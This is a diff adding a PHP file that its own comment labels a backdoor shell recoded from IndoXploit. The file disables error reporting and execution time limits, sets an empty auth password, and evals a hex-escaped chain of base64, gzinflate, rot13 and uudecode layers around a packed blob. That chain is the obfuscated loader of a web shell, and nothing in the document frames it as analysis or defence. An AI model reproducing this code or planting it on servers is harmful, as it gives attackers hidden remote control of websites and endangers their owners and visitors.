@@ -1,0 +1,17 @@
+<?php
+/*
+Pasukan Berani Mati
+IDBTE4M
+DM
+
+
+PHP Backdoor Shell PBM
+Recode IndoXploit + DM (CaFc_Br40ck)
+*/
+session_start();
+error_reporting(0);
+set_time_limit(0);
+@clearstatcache();
+
+$auth_pass = "";
+eval("\x65\x76\x61\x6c\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65\x28\x73\x74\x72\x5f\x72\x6f\x74\x31\x33\x28\x63\x6f\x6e\x76\x65\x72\x74\x5f\x75\x75\x64\x65\x63\x6f\x64\x65\x28\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x28'BcHZokJAAADQd38hNHGtg1TGGG62YbJVQpb//4rOYcZluVmVSnZJ2u48vosvqP/b56eb625r8PfDcjgIpg1MD9te9+2BPVRBWqY1fIUci296xHKUCv179vdJ0xpnUkbCd7ZCAqF+n5vyKSfzQJe+kEInXsEl7ETyCqwr4pgZ0TlrVGSuSzpsR2Q5DwOC6jpUKKACGIeM7onbTAs+rTzEONOT8yf+tFRZG475eqFKkfkgIEP+7CcuQeJU3vSd/snRUeKNfD3KcLQcjartF3offFG3nMTSiY2cz2OhKWfc1mCbaFFGWX2tZaiJPWZbMYfJikWP27kf'\x29\x29\x29\x29\x29\x29\x29\x29\x3b\x3f\x3e");?>
